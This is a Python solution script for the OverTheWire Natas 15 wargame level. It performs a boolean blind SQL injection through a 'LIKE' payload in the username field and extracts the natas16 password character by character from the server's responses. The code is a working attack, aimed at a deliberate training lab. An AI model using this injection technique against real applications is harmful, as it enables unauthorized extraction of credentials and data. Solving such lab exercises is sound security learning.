#!/bin/env python3

import os
import requests as rq

import signal
import sys

try:
    natas15pass = os.environ['natas15pass']
except:
    print('run source hackall.sh')
    exit(1)

dict = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz '
plTemplate = 'natas16" AND password LIKE "'

passwd = ''
bkp_path = 'natas16/.password'

def mkReqWithPayload(pl):
    return rq.post(
        url = 'http://natas15.natas.labs.overthewire.org/',
        auth = ('natas15', natas15pass),
        params = {
            'debug': '1'
        },
        data = {
            'username': pl
        }
    )

def reset():
    global passwd
    passwd = ''
    f = open(bkp_path, 'wb')
    f.write(passwd.encode('ascii'))
    f.close()
    bkp = open(bkp_path, 'wb')
    print('\rnatas16 pass reset')

def exit_gracefully():
    print('\033[?25h', end = '')
    sys.exit(0)

def sigint_handler(sig, frame):
    print('\nSIGINT recieved')
    exit_gracefully()

signal.signal(signal.SIGINT, sigint_handler)

if os.path.exists(bkp_path):
    f = open(bkp_path, 'rb')
    passwd = f.read().decode('utf-8')
    f.close()

if len(passwd) == 32:
    res = rq.get(
        url = 'http://natas16.natas.labs.overthewire.org/',
        auth = ('natas16', passwd),
    )
    if res.ok:
        print(passwd)
        exit(0)
    else:
        reset()

print('\033[?25l', end = '')

while len(passwd) < 32:
    for i in dict:
        if i == ' ':
            reset()
            break
        pl = plTemplate + passwd + i + '%'
        r = mkReqWithPayload(pl)
        if r.ok: 
            print('\rtried:', passwd + i, end = '')
            if r.text.find('This user exists.') > -1:
                passwd += i
                print('\rhit:  ', passwd)
                bkp = open(bkp_path, 'wb')
                bkp.write(passwd.encode('ascii'))
                bkp.close()
                break

print('password =', passwd)

exit_gracefully()
